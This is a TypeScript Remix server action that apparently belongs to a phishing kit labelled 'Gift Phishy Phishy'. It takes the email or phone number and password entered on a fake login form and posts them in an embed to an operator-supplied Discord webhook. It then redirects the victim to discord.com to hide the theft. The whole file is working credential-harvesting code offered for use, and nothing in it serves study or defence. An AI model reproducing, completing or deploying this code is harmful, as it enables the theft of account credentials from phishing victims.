/**
 * @file Manages the submitted data and sends it to a discord webhook
 * @author enriktigasna
 * @version 1.0.0
*/


import { ActionFunction, redirect } from "remix";

export let action: ActionFunction = async ({ request }) => {
  
  // Pretty self explanatory, enter your link here 
  let link = "PUT WEBHOOK HERE"

  function sendMessage(link:string, username:string, password:string) {

    // Sets the JSON for the webhook, to stylize it, and enters the data (username and password)
    const parammies = {
      "content": null,
      "embeds": [
        {
          "title": "Gift Phishy Phishy",
          "url": "https://www.youtube.com/channel/UCsbJ4PPQvLUf1EJsQPXlJWQ",
          "color": 8589328,
          "fields": [
            {
              "name": "Email or Phone Number",
              "value": username,
              "inline": true
            },
            {
              "name": "Password",
              "value": password,
              "inline": true
            }
          ],
          "footer": {
            "text": "Abomination made by: enriktigasna"
          }
        }
      ]
    }

    // Configures the request so that it can be read by the webhook
    const requestOptions = {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(parammies)
    };

    // Uses the fetch method to send the webhook.
    // Interestingly, we don't have to use any .then(..) since we aren't interested in the response. We just want to send the info to the webhook
    fetch(link, requestOptions)
    
  }

  // Retrieves the form data from $.tsx
  let body = request.formData();
  let username = (await body).get("email");
  let password = (await body).get("password");

  // Parses the FormDataEntryValue as String, to prepare it for the next function
  username = String(username);
  password = String(password);

  // Executes the function, with the link, username, and password
  sendMessage(link, username, password);
  return redirect("http://discord.com");
}